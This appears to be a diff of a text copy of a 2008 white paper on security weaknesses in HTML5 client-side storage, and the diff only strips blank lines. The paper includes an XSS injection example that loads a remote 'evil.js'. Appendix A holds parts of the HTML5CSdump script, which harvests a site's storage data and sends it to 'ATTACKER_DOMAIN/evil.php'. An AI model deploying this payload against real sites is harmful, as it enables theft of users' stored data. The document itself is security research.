@@ -63,22 +63,13 @@ page going offline. To read the original, follow the link above.
 Abusing HTML 5 Structured
 Client-side Storage
 
-
-
-
                                                   ALBERTO TRIVERO
 
 First release: 20 July 2008
 Latest revision: 17 October 2008
 
-
-
-
                                    Sponsored by
 Alberto Trivero     Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com
-
-
-
 
 Table of Contents
 
@@ -103,12 +94,8 @@ Table of Contents
     References                                                                                                     8
     Appendix A                                                                                                   10
 
-
-
-
                                                               1
 Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com      www.secdiscover.com
-
 
 Introduction
 Client-side storage is at the heart of modern web technologies and it’s very important for many web developers. Currently
@@ -134,7 +121,6 @@ browsers has already adopted some of them.
 
 The aim of this white paper is to analyze security implications of this new client-side storage technology, showing how
 different attacks can be conduct in order to steal storage data in the client’s machine.
-
 
 HTML 5 Structured Client-side Storage
 Structured client-side storage [9], this is the complete name of the storage solution adopted by HTML 5, is probably the
@@ -170,8 +156,6 @@ var storSupp = "";
 if("sessionStorage" in window) { storSupp += "Session Storage "; }
 if("globalStorage" in window) { storSupp += "Global Storage "; }
 if("localStorage" in window) { storSupp += "Local Storage "; }
-
-
 
                                                                   2
 Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com
@@ -233,8 +217,6 @@ Similarly to Google Gears, HTML 5’s database storage allows a web application 
 machine using a real SQL database. This feature will allow the development of very powerful applications. A simple example
 [14] was released by the developers of WebKit, the only that now supports database storage.
 
-
-
                                                                  3
 Alberto Trivero          Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com       www.secdiscover.com
 
@@ -255,7 +237,6 @@ WebKit (therefore Safari and so on) uses SQLite as database backend. Under Mac O
 
 Could be useful to use the Safari’s Web Inspector to navigate through the content of a site’s local database and forgering
 SQL queries.
-
 
 Some Boring (in)Security
 At this point we can draw the first conclusions about security implications of HTML 5 structured client-side storage.
@@ -298,10 +279,8 @@ objects. So how to obtain false, as expected? With WebKit we can use sessionStor
 and Internet Explorer it’s been impossible, for me, to obtain false, even using toString(), quite odd. This strange facts makes
 very easy to write buggy JavaScript code that could create unintended and potentially insecure behaviors.
 
-
                                                                    4
 Alberto Trivero       Abusing HTML 5 Structured Client-side Storage          a.trivero(*)secdiscover.com       www.secdiscover.com
-
 
 Abusing HTML 5 Structured Client-side Storage
 Although researchers like Ronald van den Heetkamp [17] have already underlined the risks of client-side storage in HTML 5
@@ -359,12 +338,8 @@ for(i = 0; i < localStorage.length; i++) {
         ls += localStorage.key(i) + " ";
 }
 
-
-
-
                                                                   5
 Alberto Trivero        Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com      www.secdiscover.com
-
 
 Database Object Enumeration
 The HTML 5 draft says that “there is no way to enumerate or delete the databases available for a domain from this API”. So
@@ -423,8 +398,6 @@ name without the need of any user interaction (except to click on a link) and wi
 structure of the web application. The script is available at the appendix A of this white paper and at this address: http://
 trivero.secdiscover.com/html5csdump.js
 
-
-
                                                                  6
 Alberto Trivero       Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com     www.secdiscover.com
 
@@ -433,9 +406,6 @@ An example to inject the script in a XSS vulnerable page is this:
 http://example.com/page.php?name=<script src=http://foo.com/evil.js></script>
 
 An example of the script’s output is this:
-
-
-
 
 As you can see the script gives to the attacker informations on the user agent of the victim, what client-side storage
 methodologies it supports, and all the content of the storage data for the attacked domain.
@@ -452,8 +422,6 @@ Cross-domain and Cross-port Attacks
 Cross-domain attacks are feasible against global storage in Firefox 2.0, and can happen when there are weak domain
 restrictions. Imagine a user who uses admin.example.com which saves on his computer
 globalStorage[‘example.com’].privID = 31337, now if someone has the control of, for example,
-
-
 
                                                                 7
 Alberto Trivero        Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com
@@ -487,7 +455,6 @@ attach external databases, a big deal in Firefox) are blocked. HTML 5 draft does
 be allowed, we’ll see when also Firefox, Internet Explorer and Opera will support database storage, if they make the mistake
 to allow these potentially dangerous statements.
 
-
 Conclusions
 It’s quite obvious with the passage of time the attack surface for web applications will grow. HTML 5 structured client-side
 storage is a powerful instrument for web developers, but introduces new relevant risks. In this white paper we’ve seen some
@@ -499,7 +466,6 @@ grow its adoption thanks for the support by the browser’s vendors and the pass
 Finally browser’s vendors should allow much more control to the end users to see and manage the HTML 5 client-side
 storage and, since deprecated, I would like to see global storage being removed in favor of the better local storage. But
 browser vendors rarely remove features, we’ll see what will happen.
-
 
 References
 [1] http://tools.ietf.org/html/rfc2965
@@ -515,7 +481,6 @@ side-storage
 [10] http://developer.mozilla.org/En/DOM:Storage
 [11] http://msdn.microsoft.com/en-us/library/cc197062(VS.85).aspx
 
-
                                                                  8
 Alberto Trivero      Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com   www.secdiscover.com
 
@@ -528,23 +493,16 @@ Alberto Trivero      Abusing HTML 5 Structured Client-side Storage       a.trive
 [18] http://www.gnucitizen.org/blog/client-side-sql-injection-attacks/
 [19] http://www.niallkennedy.com/blog/2007/01/ajax-performance-local-storage.html
 
-
-
-
                                                                9
 Alberto Trivero   Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com
-
 
 Appendix A
 /*/
  * HTML5CSdump v0.6 - August 2008
- *
  * This JavaScript code will dump in an automated fashion ALL the content of the
  * HTML 5 Client-side Storage technology of the attacked domain.
- *
  * Download the last version at: http://trivero.secdiscover.com/html5csdump.js
  * Related white paper: http://trivero.secdiscover.com/html5whitepaper.pdf
- *
  * Coded by Alberto 'ameft' Trivero - a.trivero(*)secdiscover.com
 /*/
 
@@ -606,7 +564,6 @@ name=?", [row['name']], function(ty, result2) {
                                                       var theRegExp = /^[^(]*\(`/;
                                                       var columns = dbSchema.split(theRegExp);
 
-
                                                            10
 Alberto Trivero   Abusing HTML 5 Structured Client-side Storage        a.trivero(*)secdiscover.com   www.secdiscover.com
 
@@ -652,8 +609,5 @@ var dump_res = "User%20Agent%3A%20" + ua +
                "%0D%0A%0D%0A%09%3D%20DATABASE%20STORAGE%20%3D%0D%0A%0D%0A" + dump_db;
 
 document.write('<img src="http://ATTACKER_DOMAIN/evil.php?name=' + dump_res + '">');
-
-
-
 
                                                            11
